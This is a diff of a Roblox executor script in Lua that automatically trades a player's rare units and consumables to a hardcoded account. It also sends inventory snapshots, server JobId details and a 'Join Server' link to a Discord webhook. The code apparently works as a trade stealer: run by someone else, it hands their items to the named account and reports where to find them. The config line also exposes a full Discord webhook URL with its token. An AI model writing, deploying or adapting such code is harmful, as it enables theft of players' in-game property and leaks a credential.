@@ -1,6 +1,15 @@
 --=====================================================================
--- Anime Dice Auto-Trade + Inventory Webhook
+-- Anime Dice Auto-Trade + Inventory Webhook + Join Server Button
 --=====================================================================
+-- Features:
+--   • Picks up matching units from your plot via PlotService.InteractSlot
+--   • Race-safe offer pushing (chunks + server-confirmed sync)
+--   • Holds ready state if the server un-readies you mid-trade
+--   • Discord webhook with units grouped by rarity (tier emojis)
+--   • Items grouped by category (Jackpot / Lucky / Spins / Gems / etc.)
+--   • Join Server button + clickable embed title that opens the exact server
+--=====================================================================
+
 local Players     = game:GetService("Players")
 local RS          = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
@@ -9,20 +18,23 @@ local LocalPlayer = Players.LocalPlayer
 --=====================================================================
 -- CONFIG
 --=====================================================================
+-- ⚠️  Regenerate this webhook after testing — it's been shared publicly.
 local WEBHOOK_URL  = "https://discord.com/api/webhooks/1556171079893131451/fCZxVRWYBYm3cmxrn73bvtc5m5DYqOMYQsYFKvBJBUaZyDSunPnHT0iQnbG2xRKWdKA7"
 
 local TARGET_NAME  = "only1Sherifalt1"
 local PICKUP_DELAY = 0.35
 
+-- Offer pacing
 local OFFER_PUSH_DELAY  = 0.12
 local OFFER_SETTLE_WAIT = 1.5
 local READY_RETRY_DELAY = 0.5
 local READY_MAX_RETRIES = 6
 
 -- When to send the webhook
-local WEBHOOK_ON_START = true    -- send a snapshot right before requesting trade
-local WEBHOOK_ON_END   = true    -- send a snapshot after trade completes
+local WEBHOOK_ON_START = true
+local WEBHOOK_ON_END   = true
 
+-- Rarity filter (which rarities get picked up from plot & offered)
 local RARITY_FILTER = {
     ["Celestial"] = true,
     ["Secret I"]  = true,
@@ -30,6 +42,7 @@ local RARITY_FILTER = {
     ["Mythical"]  = true,
 }
 
+-- Consumables to send
 local CONSUMABLES = {
     "Luck III", "Luck II", "Luck I", "Luck IV",
     "Lucky Spin", "Jackpot Spin",
@@ -37,7 +50,7 @@ local CONSUMABLES = {
 }
 
 --=====================================================================
--- Rarity display (order + emoji)
+-- Rarity display data
 --=====================================================================
 local RARITY_ORDER = {
     "Secret II", "Secret I", "Celestial", "Divine", "Exotic",
@@ -77,7 +90,7 @@ local RARITY_COLOR = {
 }
 
 --=====================================================================
--- Item emoji resolution (order matters — specific first)
+-- Helpers
 --=====================================================================
 local function getItemEmoji(name)
     if not name then return "📦" end
@@ -94,9 +107,6 @@ local function getItemEmoji(name)
     return "📦"
 end
 
---=====================================================================
--- Number formatter (1.23K, 4.56M, etc.)
---=====================================================================
 local function formatNumber(n)
     local suffixes = { "", "K", "M", "B", "T", "Qa", "Qi", "Sx", "Sp", "Oc", "No", "Dc" }
     n = tonumber(n) or 0
@@ -107,6 +117,17 @@ local function formatNumber(n)
         i = i + 1
     end
     return string.format("%.2f%s", n, suffixes[i])
+end
+
+local function getServerLink()
+    local placeId = tostring(game.PlaceId)
+    local jobId   = tostring(game.JobId)
+    return {
+        placeId  = placeId,
+        jobId    = jobId,
+        deepLink = ("roblox://placeId=%s&gameInstanceId=%s"):format(placeId, jobId),
+        webLink  = ("https://www.roblox.com/games/start?placeId=%s&gameInstanceId=%s"):format(placeId, jobId),
+    }
 end
 
 --=====================================================================
@@ -193,7 +214,7 @@ local function getRarity(entry)
 end
 
 --=====================================================================
--- HTTP post — tries every common executor HTTP API
+-- HTTP
 --=====================================================================
 local function httpPost(url, body)
     local headers = { ["Content-Type"] = "application/json" }
@@ -211,15 +232,15 @@ local function httpPost(url, body)
         local ok, res = pcall(http.request, payload)
         if ok and res then return true, res end
     end
-    return false, "No HTTP library available in this executor"
+    return false, "No HTTP library available"
 end
 
 --=====================================================================
--- Build unit fields (one per rarity tier)
+-- Webhook builders
 --=====================================================================
 local function buildUnitFields(inventory)
     local byRarity = {}
-    for _, rarity in ipairs(RARITY_ORDER) do byRarity[rarity] = {} end
+    for _, r in ipairs(RARITY_ORDER) do byRarity[r] = {} end
     byRarity["Unknown"] = {}
 
     local totalUnits = 0
@@ -236,7 +257,6 @@ local function buildUnitFields(inventory)
         end
     end
 
-    -- Sort each tier: higher amount first, then name
     for _, list in pairs(byRarity) do
         table.sort(list, function(a, b)
             if a.amount ~= b.amount then return a.amount > b.amount end
@@ -245,61 +265,43 @@ local function buildUnitFields(inventory)
     end
 
     local fields = {}
-    local displayOrder = {}
-    for _, r in ipairs(RARITY_ORDER) do displayOrder[#displayOrder + 1] = r end
-    displayOrder[#displayOrder + 1] = "Unknown"
+    local order = {}
+    for _, r in ipairs(RARITY_ORDER) do order[#order + 1] = r end
+    order[#order + 1] = "Unknown"
 
-    for _, rarity in ipairs(displayOrder) do
+    for _, rarity in ipairs(order) do
         local list = byRarity[rarity]
         if list and #list > 0 then
             local lines = {}
-            local bufferLen = 0
+            local bufLen = 0
             for _, u in ipairs(list) do
-                local line = ("%s **%s** x%s"):format(
-                    RARITY_EMOJI[rarity] or "❔",
-                    u.name,
-                    formatNumber(u.amount)
-                )
-                if bufferLen + #line + 1 > 1000 then
-                    lines[#lines + 1] = "…"
-                    break
-                end
+                local line = ("%s **%s** x%s"):format(RARITY_EMOJI[rarity] or "❔", u.name, formatNumber(u.amount))
+                if bufLen + #line + 1 > 1000 then lines[#lines + 1] = "…"; break end
                 lines[#lines + 1] = line
-                bufferLen = bufferLen + #line + 1
+                bufLen = bufLen + #line + 1
             end
-            local fieldName = ("%s %s — %d unique"):format(
-                RARITY_EMOJI[rarity] or "❔",
-                rarity,
-                #list
-            )
             fields[#fields + 1] = {
-                name = fieldName,
+                name = ("%s %s — %d unique"):format(RARITY_EMOJI[rarity] or "❔", rarity, #list),
                 value = table.concat(lines, "\n"),
                 inline = false,
             }
         end
     end
-
     return fields, totalUnits
 end
 
---=====================================================================
--- Build item fields (grouped by category)
---=====================================================================
 local function buildItemFields(inventory)
-    -- Categories in order — matched by substring against entry.name
     local CATEGORIES = {
-        { name = "🎰 Jackpot Spins",   patterns = { "Jackpot Spin" }, emoji = "🎰" },
-        { name = "🍀 Lucky Spins",     patterns = { "Lucky Spin" },   emoji = "🍀" },
-        { name = "🎡 Spins",           patterns = { "^Spin", " Spin$" }, emoji = "🎡" },
-        { name = "💎 Gems",            patterns = { "Gems" },          emoji = "💎" },
-        { name = "🍀 Luck Potions",    patterns = { "Luck" },          emoji = "🍀" },
-        { name = "💰 Income Potions",  patterns = { "Income" },        emoji = "💰" },
-        { name = "🎲 Trait Rerolls",   patterns = { "Trait Reroll" },  emoji = "🎲" },
-        { name = "📈 Grade Rerolls",   patterns = { "Grade" },         emoji = "📈" },
+        { name = "🎰 Jackpot Spins",  patterns = { "Jackpot Spin" }, emoji = "🎰" },
+        { name = "🍀 Lucky Spins",    patterns = { "Lucky Spin" },   emoji = "🍀" },
+        { name = "🎡 Spins",          patterns = { "^Spin", " Spin$" }, emoji = "🎡" },
+        { name = "💎 Gems",           patterns = { "Gems" },          emoji = "💎" },
+        { name = "🍀 Luck Potions",   patterns = { "Luck" },          emoji = "🍀" },
+        { name = "💰 Income Potions", patterns = { "Income" },        emoji = "💰" },
+        { name = "🎲 Trait Rerolls",  patterns = { "Trait Reroll" },  emoji = "🎲" },
+        { name = "📈 Grade Rerolls",  patterns = { "Grade" },         emoji = "📈" },
     }
 
-    -- Collect all non-unit entries with amount > 0
     local items = {}
     for key, entry in pairs(inventory) do
         if type(key) == "string" and type(entry) == "table" and entry.name then
@@ -307,21 +309,15 @@ local function buildItemFields(inventory)
             if cfg and cfg.kind ~= "Unit" then
                 local amt = tonumber(entry.amount) or 0
                 if amt > 0 then
-                    items[#items + 1] = {
-                        name = entry.name,
-                        amount = math.floor(amt),
-                    }
+                    items[#items + 1] = { name = entry.name, amount = math.floor(amt) }
                 end
             end
         end
     end
 
     if #items == 0 then return {}, 0 end
-
-    -- Sort items alphabetically
     table.sort(items, function(a, b) return a.name < b.name end)
 
-    -- Assign each item to the first matching category (or fallback)
     local grouped = {}
     local totalItems = 0
     local ungrouped = {}
@@ -340,30 +336,20 @@ local function buildItemFields(inventory)
             end
             if placed then break end
         end
-        if not placed then
-            ungrouped[#ungrouped + 1] = it
-        end
+        if not placed then ungrouped[#ungrouped + 1] = it end
     end
 
-    -- Build fields
     local fields = {}
     for _, cat in ipairs(CATEGORIES) do
         local g = grouped[cat.name]
         if g and #g.list > 0 then
             local lines = {}
-            local bufferLen = 0
+            local bufLen = 0
             for _, it in ipairs(g.list) do
-                local line = ("%s **%s** x%s"):format(
-                    g.emoji,
-                    it.name,
-                    formatNumber(it.amount)
-                )
-                if bufferLen + #line + 1 > 1000 then
-                    lines[#lines + 1] = "…"
-                    break
-                end
+                local line = ("%s **%s** x%s"):format(g.emoji, it.name, formatNumber(it.amount))
+                if bufLen + #line + 1 > 1000 then lines[#lines + 1] = "…"; break end
                 lines[#lines + 1] = line
-                bufferLen = bufferLen + #line + 1
+                bufLen = bufLen + #line + 1
             end
             fields[#fields + 1] = {
                 name = ("%s (%d types)"):format(cat.name, #g.list),
@@ -373,18 +359,14 @@ local function buildItemFields(inventory)
         end
     end
 
-    -- Everything else goes in one "Other Items" field
     if #ungrouped > 0 then
         local lines = {}
-        local bufferLen = 0
+        local bufLen = 0
         for _, it in ipairs(ungrouped) do
             local line = ("📦 **%s** x%s"):format(it.name, formatNumber(it.amount))
-            if bufferLen + #line + 1 > 1000 then
-                lines[#lines + 1] = "…"
-                break
-            end
+            if bufLen + #line + 1 > 1000 then lines[#lines + 1] = "…"; break end
             lines[#lines + 1] = line
-            bufferLen = bufferLen + #line + 1
+            bufLen = bufLen + #line + 1
         end
         fields[#fields + 1] = {
             name = ("📦 Other Items (%d types)"):format(#ungrouped),
@@ -392,12 +374,11 @@ local function buildItemFields(inventory)
             inline = false,
         }
     end
-
     return fields, totalItems
 end
 
 --=====================================================================
--- Send the webhook
+-- Send webhook
 --=====================================================================
 local function sendInventoryWebhook(label)
     if WEBHOOK_URL == "" or string.find(WEBHOOK_URL, "PASTE_YOUR") then
@@ -414,17 +395,32 @@ local function sendInventoryWebhook(label)
     local unitFields, totalUnits = buildUnitFields(inventory)
     local itemFields, totalItems = buildItemFields(inventory)
 
-    -- Discord: 25 fields max per embed. Prioritize units (they're the focus),
-    -- then items. If we blow the cap, drop item fields first.
+    local srv         = getServerLink()
+    local playerCount = #Players:GetPlayers()
+    local maxPlayers  = Players.MaxPlayers
+
+    -- Discord allows 25 fields max. Server info goes first.
     local allFields = {}
-    for _, f in ipairs(unitFields) do allFields[#allFields + 1] = f end
+
+    allFields[#allFields + 1] = {
+        name = "🔗 Server Info",
+        value = ("`JobId: %s`\n`Players: %d/%d`\n`Place: %s`"):format(
+            srv.jobId, playerCount, maxPlayers, srv.placeId
+        ),
+        inline = false,
+    }
+
+    for _, f in ipairs(unitFields) do
+        if #allFields >= 25 then break end
+        allFields[#allFields + 1] = f
+    end
     for _, f in ipairs(itemFields) do
         if #allFields >= 25 then break end
         allFields[#allFields + 1] = f
     end
 
-    -- Determine embed color from the highest-tier rarity present
-    local embedColor = 0x2ECC71   -- default green
+    -- Color from highest-tier rarity present
+    local embedColor = 0x2ECC71
     for _, rarity in ipairs(RARITY_ORDER) do
         for _, f in ipairs(unitFields) do
             if string.find(f.name, rarity, 1, true) then
@@ -435,25 +431,36 @@ local function sendInventoryWebhook(label)
     end
     ::done::
 
-    local titlePrefix = label and ("📦 Inventory Snapshot — " .. label) or "📦 Inventory Snapshot"
+    local titlePrefix = label
+        and ("📦 Inventory Snapshot — " .. label)
+        or  "📦 Inventory Snapshot"
 
     local payload = {
         username = "Anime Dice Tracker",
         embeds = {
             {
-                title = titlePrefix,
+                title       = titlePrefix,
+                url         = srv.webLink,
                 description = ("**%s**\n%d units  •  %d items  •  %d unique unit types"):format(
-                    LocalPlayer.Name,
-                    totalUnits,
-                    totalItems,
-                    #unitFields
+                    LocalPlayer.Name, totalUnits, totalItems, #unitFields
                 ),
-                color = embedColor,
-                fields = allFields,
-                footer = {
-                    text = "Anime Dice • " .. os.date("%Y-%m-%d %H:%M:%S")
-                },
+                color     = embedColor,
+                fields    = allFields,
+                footer    = { text = "Anime Dice • " .. os.date("%Y-%m-%d %H:%M:%S") },
                 timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+            }
+        },
+        components = {
+            {
+                type = 1,
+                components = {
+                    {
+                        type  = 2,
+                        style = 5,
+                        label = "🎮 Join Server",
+                        url   = srv.webLink,
+                    },
+                }
             }
         }
     }
@@ -563,9 +570,9 @@ local function buildOffer()
                     local locked = entry.attributes and entry.attributes.locked == true
                     if not locked then
                         plan[#plan + 1] = {
-                            key = key,
+                            key    = key,
                             amount = math.max(1, tonumber(entry.amount) or 1),
-                            label = entry.name .. " (" .. rarity .. ")",
+                            label  = entry.name .. " (" .. rarity .. ")",
                         }
                     end
                 end
@@ -573,9 +580,9 @@ local function buildOffer()
                 local amt = tonumber(entry.amount) or 0
                 if amt > 0 then
                     plan[#plan + 1] = {
-                        key = key,
+                        key    = key,
                         amount = math.floor(amt),
-                        label = entry.name .. " x" .. math.floor(amt),
+                        label  = entry.name .. " x" .. math.floor(amt),
                     }
                 end
             end
@@ -649,7 +656,7 @@ local function holdReady()
 end
 
 --=====================================================================
--- Find target
+-- Find target player
 --=====================================================================
 local function findTarget()
     for _, p in Players:GetPlayers() do
@@ -684,9 +691,6 @@ if #plan == 0 then
     return
 end
 
---=====================================================================
--- WEBHOOK: send snapshot right before the trade starts
---=====================================================================
 if WEBHOOK_ON_START then
     print("[MAIN] Sending pre-trade webhook...")
     pcall(sendInventoryWebhook, "Pre-Trade")
@@ -698,9 +702,10 @@ fire(RequestTrade, target)
 local startDeadline = os.clock() + 10
 while not trade.active and os.clock() < startDeadline do task.wait(0.1) end
 if not trade.active then
-    warn("[ERROR] Trade did not start")
+    warn("[ERROR] Trade did not start — did the alt accept?")
     return
 end
+print("[MAIN] Trade started")
 
 print("[MAIN] Step 4: Pushing offer...")
 local synced = waitForOfferSync(plan, 20)
@@ -745,11 +750,8 @@ end
 
 print("[DONE] Trade complete")
 
---=====================================================================
--- WEBHOOK: send post-trade snapshot
---=====================================================================
 if WEBHOOK_ON_END then
-    task.wait(2)   -- give inventory time to sync
+    task.wait(2)
     print("[MAIN] Sending post-trade webhook...")
     pcall(sendInventoryWebhook, "Post-Trade")
 end
